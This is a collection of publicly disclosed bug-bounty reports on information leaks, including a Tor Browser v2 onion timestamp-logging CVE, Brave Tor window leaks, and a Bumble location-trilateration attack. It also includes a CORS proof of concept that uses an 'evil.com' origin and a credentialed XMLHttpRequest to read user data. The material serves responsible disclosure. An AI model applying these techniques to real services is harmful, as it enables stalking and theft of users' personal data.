A vulnerability in the Tor Browser 78.11.0esr and below allows a local or physical attacker to view metadata about v2 domains, namely the exact timestamp that a user connected to a v2 onion address while using either the --log or --verbose command line options. A local or physical attacker can identify the exact moment a user connected to a new v2 onion site, easily triangulating the user via a complete log of connection timestamps in the log file, or verbosely in the terminal window. This timestamp is generated every single time a client connects to a v2 onion address and could therefore be easily compared with a server connection log, a compromised Tor end point, or other related Tor attack, affecting the confidentiality & integrity of a user's Tor session when using --log or --verbose.

## Steps To Reproduce:
Download Tor latest
Use either:
`./start-tor-browser.desktop --log ./file.log`
`./start-tor-browser.desktop --verbose`

Visit http://wikitoronionlinks.com/

Click on an assortment of .onion v2 URLs.

Inspect the output.

Notably, the warning occurs when the client connects, rather than clicking a link, making it even easier to pair up with server connection times.

## Supporting Material/References:

```
[user@hostname tor-browser_en-US]$ ./start-tor-browser.desktop --verbose
Launching './Browser/start-tor-browser --detach --verbose'...
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 37: Use of ambiguous path in <dir> element. please add prefix="cwd" if current behavior is desired.
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 85: unknown element "blank"
Jul 02 20:06:58.983 [notice] Tor 0.4.5.9 (git-d0ed04d50e80fe1c) running on Linux with Libevent 2.1.11-stable, OpenSSL 1.1.1k, Zlib 1.2.11, Liblzma N/A, Libzstd N/A and Glibc 2.33 as libc.
Jul 02 20:06:58.983 [notice] Tor can't help you if you use it wrong! Learn how to be safe at https://www.torproject.org/download/download#warning
Jul 02 20:06:58.983 [notice] Read configuration file "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/Tor/torrc-defaults".
Jul 02 20:06:58.983 [notice] Read configuration file "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/Tor/torrc".
Jul 02 20:06:58.984 [notice] Opening Control listener on 127.0.0.1:9151
Jul 02 20:06:58.984 [notice] Opened Control listener connection (ready) on 127.0.0.1:9151
Jul 02 20:06:58.984 [notice] DisableNetwork is set. Tor will not make or accept non-control network connections. Shutting down all existing connections.
Jul 02 20:06:58.000 [notice] Parsing GEOIP IPv4 file /tmp/tor-browser_en-US/Browser/TorBrowser/Data/Tor/geoip.
Jul 02 20:06:59.000 [notice] Parsing GEOIP IPv6 file /tmp/tor-browser_en-US/Browser/TorBrowser/Data/Tor/geoip6.
Jul 02 20:06:59.000 [notice] Bootstrapped 0% (starting): Starting
Jul 02 20:06:59.000 [notice] Starting with guard context "default"
Jul 02 20:06:59.000 [notice] Delaying directory fetches: DisableNetwork is set.
Jul 02 20:06:59.000 [notice] New control connection opened from 127.0.0.1.
Jul 02 20:06:59.000 [notice] DisableNetwork is set. Tor will not make or accept non-control network connections. Shutting down all existing connections.
Jul 02 20:06:59.000 [notice] New control connection opened from 127.0.0.1.
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 37: Use of ambiguous path in <dir> element. please add prefix="cwd" if current behavior is desired.
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 85: unknown element "blank"
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 37: Use of ambiguous path in <dir> element. please add prefix="cwd" if current behavior is desired.
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 85: unknown element "blank"
Jul 02 20:07:01.000 [notice] DisableNetwork is set. Tor will not make or accept non-control network connections. Shutting down all existing connections.
Jul 02 20:07:01.000 [notice] DisableNetwork is set. Tor will not make or accept non-control network connections. Shutting down all existing connections.
Jul 02 20:07:01.000 [notice] DisableNetwork is set. Tor will not make or accept non-control network connections. Shutting down all existing connections.
Jul 02 20:07:01.000 [notice] Opening Socks listener on 127.0.0.1:9150
Jul 02 20:07:01.000 [notice] Opened Socks listener connection (ready) on 127.0.0.1:9150
Jul 02 20:07:01.000 [notice] Renaming old configuration file to "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/Tor/torrc.orig.1"
Jul 02 20:07:02.000 [notice] Bootstrapped 5% (conn): Connecting to a relay
Jul 02 20:07:02.000 [notice] Bootstrapped 10% (conn_done): Connected to a relay
Jul 02 20:07:02.000 [notice] Bootstrapped 14% (handshake): Handshaking with a relay
Jul 02 20:07:02.000 [notice] Bootstrapped 15% (handshake_done): Handshake with a relay done
Jul 02 20:07:02.000 [notice] Bootstrapped 20% (onehop_create): Establishing an encrypted directory connection
Jul 02 20:07:02.000 [notice] Bootstrapped 25% (requesting_status): Asking for networkstatus consensus
Jul 02 20:07:02.000 [notice] Bootstrapped 30% (loading_status): Loading networkstatus consensus
Jul 02 20:07:03.000 [notice] I learned some more directory information, but not enough to build a circuit: We have no usable consensus.
Jul 02 20:07:04.000 [notice] Bootstrapped 40% (loading_keys): Loading authority key certs
Jul 02 20:07:04.000 [notice] The current consensus has no exit nodes. Tor can only build internal paths, such as paths to onion services.
Jul 02 20:07:04.000 [notice] Bootstrapped 45% (requesting_descriptors): Asking for relay descriptors
Jul 02 20:07:04.000 [notice] I learned some more directory information, but not enough to build a circuit: We need more microdescriptors: we have 0/6832, and can only build 0% of likely paths. (We have 0% of guards bw, 0% of midpoint bw, and 0% of end bw (no exits in consensus, using mid) = 0% of path bw.)
Jul 02 20:07:05.000 [notice] Bootstrapped 50% (loading_descriptors): Loading relay descriptors
Jul 02 20:07:06.000 [notice] The current consensus contains exit nodes. Tor can build exit and internal paths.
Jul 02 20:07:07.000 [notice] Bootstrapped 55% (loading_descriptors): Loading relay descriptors
Jul 02 20:07:07.000 [notice] Bootstrapped 60% (loading_descriptors): Loading relay descriptors
Jul 02 20:07:07.000 [notice] Bootstrapped 69% (loading_descriptors): Loading relay descriptors
Jul 02 20:07:08.000 [notice] Bootstrapped 75% (enough_dirinfo): Loaded enough directory info to build circuits
Jul 02 20:07:08.000 [notice] Bootstrapped 80% (ap_conn): Connecting to a relay to build circuits
Jul 02 20:07:08.000 [notice] Bootstrapped 85% (ap_conn_done): Connected to a relay to build circuits
Jul 02 20:07:08.000 [notice] Bootstrapped 89% (ap_handshake): Finishing handshake with a relay to build circuits
Jul 02 20:07:09.000 [notice] Bootstrapped 90% (ap_handshake_done): Handshake finished with a relay to build circuits
Jul 02 20:07:09.000 [notice] Bootstrapped 95% (circuit_create): Establishing a Tor circuit
Jul 02 20:07:10.000 [notice] Bootstrapped 100% (done): Done
Jul 02 20:07:10.000 [notice] New control connection opened from 127.0.0.1.
Jul 02 20:07:10.000 [notice] New control connection opened from 127.0.0.1.
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 37: Use of ambiguous path in <dir> element. please add prefix="cwd" if current behavior is desired.
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 85: unknown element "blank"
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 37: Use of ambiguous path in <dir> element. please add prefix="cwd" if current behavior is desired.
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 85: unknown element "blank"
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 37: Use of ambiguous path in <dir> element. please add prefix="cwd" if current behavior is desired.
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 85: unknown element "blank"
Jul 02 20:07:58.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 37: Use of ambiguous path in <dir> element. please add prefix="cwd" if current behavior is desired.
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 85: unknown element "blank"
Jul 02 20:07:59.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 37: Use of ambiguous path in <dir> element. please add prefix="cwd" if current behavior is desired.
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 85: unknown element "blank"
Jul 02 20:07:59.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 37: Use of ambiguous path in <dir> element. please add prefix="cwd" if current behavior is desired.
Fontconfig warning: "/tmp/tor-browser_en-US/Browser/TorBrowser/Data/fontconfig/fonts.conf", line 85: unknown element "blank"
Jul 02 20:08:07.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
Jul 02 20:08:07.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
Jul 02 20:08:10.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
Jul 02 20:08:28.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
Jul 02 20:08:28.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
Jul 02 20:08:28.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
Jul 02 20:08:28.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
Jul 02 20:08:28.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
Jul 02 20:09:30.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
^[[1;2D	^CJul 02 20:19:34.000 [notice] Interrupt: exiting cleanly.
Exiting due to channel error.
Exiting due to channel error.
Exiting due to channel error.
Exiting due to channel error.
Exiting due to channel error.
Exiting due to channel error.
Exiting due to channel error.

```

  * [attachment / reference]

## Impact

Violate the confidentiality & integrity of a user's Tor session.

**Summary (researcher):**

NOTE: This is a correlation attack and requires a sophisticated attacker to perform. A complicated attack would require physical access to the device running tor browser, as well as either operating rogue/bad exit nodes, or a compromised/fake hidden service, or combination of that.

NOTE2: Title is incorrect. The logs are always stored and can be viewed with or without flags.

### Title
CVE-2021-39246 - Tor Browser through 10.5.6 and 11.x through 11.0a4 allows a correlation attack excessive verbose logging - Windows, macOS, Linux

### CVE ID
CVE-2021-39246

### CVSS Score
Pending

### Internal ID
SICK-2021-111

# Vendor
Tor 

### Product
Tor Browser on Windows, macOS, Linux

### Product Versions
10.5.6 and 11.x through 11.0a4

### Vulnerability Details

Tor Browser through 10.5.6 and 11.x through 11.0a4 allows a correlation attack that can compromise the privacy of visits to v2 onion addresses. Exact timestamps of these onion-service visits are logged locally, and an attacker might be able to compare them to timestamp data collected by the destination server (or collected by a rogue site within the Tor network). This occurs by default, with or without verbose.

### Vendor Response
Open pull request in relation to timestamp logging as v2 will be deprecated soon:

[https://gitlab.torproject.org/tpo/core/tor/-/merge_requests/434](https://gitlab.torproject.org/tpo/core/tor/-/merge_requests/434).

### Proof of Concept

`Tor Browser` latest `10.5.6` is affected.

`Tor Browser` alpha `11.0a4` is affected.

This is because `Tor 0.4.6` introduced a warning every time a client connects to a v2 domain.

See: [https://gitlab.torproject.org/tpo/core/tor/-/commit/5e836eb80c31b97f87b152351b6a7a932aeffaed](https://gitlab.torproject.org/tpo/core/tor/-/commit/5e836eb80c31b97f87b152351b6a7a932aeffaed)

Also see "Log warning when connecting to soon-to-be-deprecated v2 onions."

https://gitlab.torproject.org/tpo/core/tor/-/commit/80c404c4b79f3bcba3fc4585d4c62a62a04f3ed9


```bash

cd /tmp

wget https://www.torproject.org/dist/torbrowser/10.5.6/tor-browser-linux64-10.5.6_en-US.tar.xz

tar -xzvf tor-browser-linux64-10.5.6_en-US.tar.xz

cd /tmp/tor-browser_en-US/

./start-tor-browser.desktop --verbose

# Launching './Browser/start-tor-browser --detach --verbose'...

```

Visit any v2 onion site, connection timestamps are logged at the exact moment the server responds.

```console
Sep 24 16:28:52.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline

Sep 24 16:28:52.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline

Sep 24 16:28:52.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline

Sep 24 16:29:02.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline

```

#### Disclosure Timeline
* **2021-07-02** - Researcher discovers vulnerability on bounty platform
* **2021-07-07** - Report closed as informative
* **2021-08-17** - Researcher requests CVE
* **2021-08-17** - Vendor re-notified via sec mailing list, and on bounty platform chat.
* **2021-09-10** - No response: researcher opens Pull Request to remove timestamps.
* **2021-09-24** - CVE published

### Links

[https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-111.md](https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-111.md)

[https://sick.codes/sick-2021-111](https://sick.codes/sick-2021-111)

[https://www.privacyaffairs.com/cve-2021-39246-tor-vulnerability/](https://www.privacyaffairs.com/cve-2021-39246-tor-vulnerability/)

[https://gitlab.torproject.org/tpo/core/tor/-/commit/80c404c4b79f3bcba3fc4585d4c62a62a04f3ed9](https://gitlab.torproject.org/tpo/core/tor/-/commit/80c404c4b79f3bcba3fc4585d4c62a62a04f3ed9)

[https://gitlab.torproject.org/tpo/core/tor/-/merge_requests/434](https://gitlab.torproject.org/tpo/core/tor/-/merge_requests/434)

[https://hackerone.com/reports/1250273](https://hackerone.com/reports/1250273)

### Researchers
- *Sick Codes* [https://github.com/sickcodes](https://github.com/sickcodes) || [https://twitter.com/sickcodes](https://twitter.com/sickcodes)

- *Miklos Zoltan* [https://twitter.com/mzb4455](https://twitter.com/mzb4455) || [https://www.privacyaffairs.com/authors/miklos/](https://www.privacyaffairs.com/authors/miklos/)

#### CVE Links

[https://sick.codes/sick-2021-111](https://sick.codes/sick-2021-111)

[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39246](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39246)

[https://nvd.nist.gov/view/vuln/detail?vulnId=CVE-2021-39246](https://nvd.nist.gov/view/vuln/detail?vulnId=CVE-2021-39246)

---

### [Information disclosure](https://hackerone.com/reports/1347249)

- **Report ID:** `1347249`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Brave Software
- **Reporter:** @kkarfalcon
- **Bounty:** - usd
- **Disclosed:** 2021-09-21T23:35:38.889Z
- **CVE(s):** -

**Vulnerability Information:**

Vulnerability tested on:- Brave	1.29.81 Chromium: 93.0.4577.82 (Official Build) (64-bit)
Vulnerability description:- For security measures and for privacy purposes, Brave has the ability to open a normal tab of the Brave when we navigate to: `chrome://wallet`, `chrome://history` etc. due to the reason that Tor should be blocking privileged URIs like `file:///`, `chrome://` etc. When we open local storage URIs or the Data URIs, it is blocking. So, we can say that TOR in Brave protects users from opening anything privileged in the browser.
But there is some weird case for: `chrome://downloads` and `brave://inspect/#devices`. Both can be dangerous when there is a UXSS present there because it can get to know about the data. The `brave://device-log/` looks interesting too, why do we see the device log of brave in the TOR Network in the Brave? 

Steps to reproduce:
1. Open Brave with TOR
2. Navigate to `brave://inspect/#devices`

Expected behavior?
--> When we are doing device debugging, it should have opened normal Brave and shouldn't open the privileged URI in the TOR session itself. Open `chrome://bookmarks` and `chrome://history`

Actual behavior?
--> It opens the debugging session inside the protected tor session.

Suggestions?
--> We should block `chrome://downloads`,  `brave://inspect/#devices`, `brave://device-log/` etc. and when somebody tries to navigate to those URIs, a normal Brave session should be started like we do for `chrome://history` as it keeps TOR away from personal information inside the brave URIs.

## Impact

Information disclosure.

---

### [Big Picture web browser leaks login cookies and discloses sensitive information (may lead to account takeover)](https://hackerone.com/reports/1079561)

- **Report ID:** `1079561`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Valve
- **Reporter:** @bugstar
- **Bounty:** - usd
- **Disclosed:** 2021-09-21T21:42:03.659Z
- **CVE(s):** -

**Summary (team):**

Researcher reported an issue where certain secure cookies would be included in a web request initiated through Steam Big Picture mode that was initially to a trusted origin but subsequently forwarded to a site on a different origin.

---

### [information discloure via logs files at ==> https://ihelp.mtnbusiness.com/logfiles/Log_21-06-2021.txt](https://hackerone.com/reports/1239633)

- **Report ID:** `1239633`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** MTN Group
- **Reporter:** @zero_or_1
- **Bounty:** - usd
- **Disclosed:** 2021-08-20T09:36:35.178Z
- **CVE(s):** -

**Vulnerability Information:**

Hi MTN team ,

i got a 500 error show the full path of the windows server containing the log file of today 
i navigate to it ==> https://ihelp.mtnbusiness.com/logfiles/Log_21-06-2021.txt
i saw all logins i made with user administrator 

as u see the logs files is a date `Log_21-06-2021.txt`
you can read every day logs via manipulate the file name :)

## Impact

Ability to see login logs

---

### [Leaked JFrog Artifactory  username and password exposed on GitHub - https://snapchat.jfrog.io](https://hackerone.com/reports/911606)

- **Report ID:** `911606`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Snapchat
- **Reporter:** @kiyell
- **Bounty:** 15000 usd
- **Disclosed:** 2021-08-12T21:40:20.667Z
- **CVE(s):** -

**Summary (team):**

Researcher found valid jFrog credentials which were committed to a public Github repository of a Snap employee. This allowed access to internal Snap libraries/artifacts along with the ability to push updates to existing artifacts as well.

---

### [Internal Gitlab Ticket Disclosure via External Slack Channels](https://hackerone.com/reports/1273292)

- **Report ID:** `1273292`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** HackerOne
- **Reporter:** @none_of_the_above
- **Bounty:** - usd
- **Disclosed:** 2021-08-04T23:48:36.101Z
- **CVE(s):** -

**Summary (team):**

@none_of_the_above was able to enumerate GitLab ticket titles and descriptions by posting links in a shared Slack channel. As part of HackerOne's investigation, it was determined that the misconfiguration could also be used to obtain the contents of exceptions from HackerOne's production environment that were captured in Sentry. Limited access to information in these two systems led to the conclusion that this was a high severity vulnerability.

No confidential information or customer information was accessed by @none_of_the_above in their proof of concept of the vulnerability. We'd like to thank @none_of_the_above for their efforts and diligence in disclosing this vulnerability to us.

**Summary (researcher):**

HackerOne Pentest Team is a group of external hackers who are selected to perform specific engagements on HackerOne. As part of this team, I have access to a Slack Workspace which is used to coordinate engagements and communicate with customers. On July 22nd I replied to a message from another pentester who was reporting a functional bug on the platform. In my reply, I included a Gitlab link with the intention of pointing out that his report was a duplicate of an internal issue which had already been reported by another hacker. I noticed that the link automatically displayed a preview of the internal ticket, which of course, should only be seen by employees. Since Gitlab issue IDs are sequential, I tried iterating the IDs and discovered that I could access partial info from any internal Gitlab issue. The engineering team promptly implemented a fix and even discovered other ways in which this vulnerability may have been abused.

---

### [All private support requests to ███████ are being disclosed at https://███████](https://hackerone.com/reports/1004964)

- **Report ID:** `1004964`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @nagli
- **Bounty:** - usd
- **Disclosed:** 2021-07-29T19:53:11.477Z
- **CVE(s):** -

**Vulnerability Information:**

Hello DoD Team
**Summary:**
I have found out that all personal requests made to https://█████ form are being disclosed to the public at https://███████, which posses a critical privacy issue.

**Description:**
While searching my name at google "naglinagli" i have encountered a weird mention of my xss payload at the following endpoint https://██████████, which made realize that all the requests made at the contact form are open to the public

## Step-by-step Reproduction Instructions

1. Navigate to https://███████
2. File a request.

█████████

3. Your request will publicly appear at https://█████

████

##
## Suggested Mitigation/Remediation Actions
Making the access to the vulnerable endpoint to authorized personal only.

##Best Regards,
nagli.

## Impact

Personal reports made to █████ including PII of customers is being disclosed to the public through publicly accessible endpoint

---

### [Exfiltrating a victim's exact location (to within 5m)](https://hackerone.com/reports/1234406)

- **Report ID:** `1234406`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Bumble
- **Reporter:** @robertheaton
- **Bounty:** - usd
- **Disclosed:** 2021-07-21T18:41:34.974Z
- **CVE(s):** -

**Vulnerability Information:**

I used Bumble's distance feature to exfiltrate the exact location (to within approx 5m) of a victim. I did this by using the Bumble API to move my attacker account's location around the approximate area of the victim. I was able to obtain the exact distance between attacker and victim at 3 separate locations, and I then used trilateration (https://gis.stackexchange.com/questions/17344/differences-between-triangulation-and-trilateration) to combine these 3 distances into a single, precise location.

This is not a new vulnerability; Tinder was found to be vulnerable to a version of it in 2014 (https://blog.includesecurity.com/2014/02/how-i-was-able-to-track-the-location-of-any-tinder-user/). What is new is the circumvention of Bumble's attempted mitigations for the Tinder attack. Tinder was trivially vulnerable to trilateration because their API returned the exact distance between attacker and victim, to 15 decimal places, and the client was responsible for rounding it. Bumble attempts to mitigate this by rounding the distance on the server, and returning only this rounded distance to the client. Simple trilateration is still possible using these rounded values, but this only gives us an accuracy of the nearest square mile or so.

However, we can massively increase the precision to the nearest few metres by hypothesising that Bumble performs server-side rounding using code like the following:

```
def calculate_rounded_distance():
  exact_distance = calculate_exact_distance()
  rounded_distance = math.floor(exact_distance)
  return rounded_distance
```

This means that we can have our attacker slowly "shuffle" around the vicinity of the victim, looking for the precise location where a victim's distance from us flips from (say) 1.0 miles to 2.0 miles. We can infer that this is the point at which the victim is exactly 1.0 miles from the attacker. We can find 3 such "flipping points" (to within arbitrary precision, say 0.001 miles), and use them to perform trilateration as before.

To reproduce:

1. Create 2 accounts - a victim and an attacker. I don't believe that they need to be made to match with each other in order to exploit this vulnerability.
2. Use Burp Suite or similar to grab the victim and attacker session IDs so that we can control them programatically via the Bumble API
3. Use the Bumble API to put the victim in a fixed, target location
4. Put the attacker in a random location in the vicinity of the victim. The attack does not require any special knowledge of the victim's location beyond the summary shown in the UI (eg. "Lambeth")
5. Step the attacker in a random direction in small increments (smaller increments take longer but give more precise locations). After each step, check the distance between attacker and victim. If it has changed, record the average of the current and previous location as being exactly the smaller of the 2 distances away from the victim.
6. If desired, repeat step 5 with a smaller step size in the vicinity of the known distance flip in order to increase precision
7. Repeat steps 4-6 3 times starting in different positions
8. Draw 3 circles, 1 for each distance found. The radius should be the distance between victim and attacker, the centre should be the point at which the distance flipped. (KML viewed in Google Earth is convenient for this step)
9. Confirm that all 3 circles cross at the same point - you should have been able to identify the victim's location to within approx 5m

I've included a Python POC with this report, and a screenshot of trilateration results produced using this script where the victim is placed at 10 Downing Street, UK. Depending on precision desired it takes approximately 10 seconds to find a victim's location.

## Impact

The Bumble API does not appear to restrict the users about whom an attacker can pull information. This means that an attacker could use this vulnerability to find the exact location of any user whose user ID they know. This includes:

* Current matches
* Past matches who have since broken up with them
* Any user whose profile the attacker has been shown in an encounter

The only restriction I've found is that sometimes the API does not return the numerical distance between the attacker and victim. I speculate that this occurs when the victim hasn't checked in for a period of time.

To mass exfiltrate the locations of a large swathe of Bumble users, an attacker could use multiple accounts with wide filters to cycle through large numbers of encounters, collecting large numbers of user IDs and then using trilateration to find all of their locations.

Revealing the exact location of Bumble users presents a grave danger to their safety, so I have filed this report with a severity of "High".

---

### [API on campus-vtc.com allows access to ~100 Uber users full names, email addresses and telephone numbers.](https://hackerone.com/reports/580268)

- **Report ID:** `580268`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Uber
- **Reporter:** @healdb
- **Bounty:** 750 usd
- **Disclosed:** 2021-07-08T20:32:18.922Z
- **CVE(s):** -

**Summary (team):**

There was an API endpoint on the Uber site campus-vtc.com that allows an attacker to view the full names, personal email addresses and phone numbers of 83 Uber France members. These were people who uploaded entries to a contest on campus-vtc.com.

**Summary (researcher):**

Endpoint leaked some PII for the 83 Uber France users who entered a contest on this site.

Check out my blog https://healdb.tech/blog/ or my Twitter https://twitter.com/heald_ben for some Bug Bounty tool releases and blogs!

---

### [DNS Leaks when using any VPN Browser extension with Brave Shield enabled](https://hackerone.com/reports/1203842)

- **Report ID:** `1203842`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Brave Software
- **Reporter:** @neeythann
- **Bounty:** - usd
- **Disclosed:** 2021-07-08T04:09:40.158Z
- **CVE(s):** CVE-2021-22916

**Summary (team):**

If Brave Shield is enabled alongside with a VPN Chrome extension and adblocking is enabled, some DNS requests may not be forwarded through the VPN tunnel.

---

### [Brave Browser Tor Window leaks user's real IP to the external DNS server](https://hackerone.com/reports/1077022)

- **Report ID:** `1077022`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Brave Software
- **Reporter:** @newfunction
- **Bounty:** - usd
- **Disclosed:** 2021-06-17T05:25:38.585Z
- **CVE(s):** CVE-2021-22917

**Vulnerability Information:**

## Summary:

When a user navigates to a URL in Tor Window, the DNS requests are sent directly without using the Tor proxy, which leaks the user's real IP address and the requested domain name to the user's ISP and the DNS server.

## Products affected: 

 * OS: Ubuntu 18.04.5 LTS x86_64
 * Brave: Version 1.18.78 Chromium: 87.0.4280.141 (Official Build) (64-bit)

## Steps To Reproduce:

 * Open WireShark, and start capturing traffic on the Internet interface. Set WireShark's display filter to `dns`.
 * Open Brave Browser. Then open new private window with Tor.
 * On the Tor window, navigate to https://tools.ietf.org/ (or any other URLs)
 * In WireShark, you can see a DNS request for tools.ietf.org sent to your DNS server.

## Supporting Material/References:

  * a screenshot attached

## Impact

Brave's Tor window passively leaks users' IP addresses and requests to DNS servers. This undermines the user's anonymity.

---

### [Cross-origin resource sharing misconfig | steal user information ](https://hackerone.com/reports/1183601)

- **Report ID:** `1183601`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** UPchieve
- **Reporter:** @n1had
- **Bounty:** - usd
- **Disclosed:** 2021-06-15T16:58:21.998Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.
Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.

#POC1

#Ruquested .

1- 

```javascript

GET /api/user HTTP/1.1
Host: app.upchieve.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate

```
2- we can add `Origin: evil.com`

```javascript

GET /api/user HTTP/1.1
Host: app.upchieve.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: evil.com
```

#Response

```javascript

HTTP/1.1 200 OK
Date: Tue, 04 May 2021 11:21:25 GMT
Content-Type: application/json; charset=utf-8
Connection: close
x-powered-by: Express
access-control-allow-origin: evil.com


{"user":{"_id":"6088429736785e00232c57de","verified":true,"verifiedEmail":true,"verifiedPhone":false,"isVolunteer":false,"isAdmin":false,"isBanned":true,"isTestUser":false,"isFakeUser":false,"isDeactivated":false,"pastSessions":["609069b08b925400233afeb7"],"type":"Student","firstname":"sfsf","lastname":"dfe","email":"2c5a43ddb7@firemailbox.club","zipCode":"77777","approvedHighschool":"5f6273fa7674f035e46b6af0","createdAt":"2021-04-27T16:57:59.882Z","lastActivityAt":"2021-05-03T21:22:08.243Z","referralCode":"YIhClzZ4XgAjLFfe","__v":0}}

```
#POC2

1- open https://example.com in browser then inspect the page and go to console.
2- run the following code in console and you would find it pops up user information

```

<html>
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://app.upchieve.org/api/user',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
</html>

```
Open above code in any browser and you would find it pops up user information like the attachment.


#How To Fix

